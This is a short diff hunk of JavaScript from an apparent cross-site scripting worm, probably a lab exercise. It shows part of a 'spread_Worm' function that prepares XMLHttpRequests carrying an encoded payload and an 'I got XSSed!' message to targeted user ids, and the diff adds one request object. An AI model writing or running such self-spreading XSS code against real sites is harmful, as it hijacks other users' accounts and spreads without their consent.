@@ -81,6 +81,7 @@ function change_Picture(){
 function spread_Worm(){
     for(let i = 134; i < 135; i++) {
         var id = i;
+        var xhy = new XMLHttpRequest();
         var xhz = new XMLHttpRequest();
         var urlpayload = encodeURIComponent(ppayload)
         var urlbrag = encodeURIComponent("I got XSSed!")
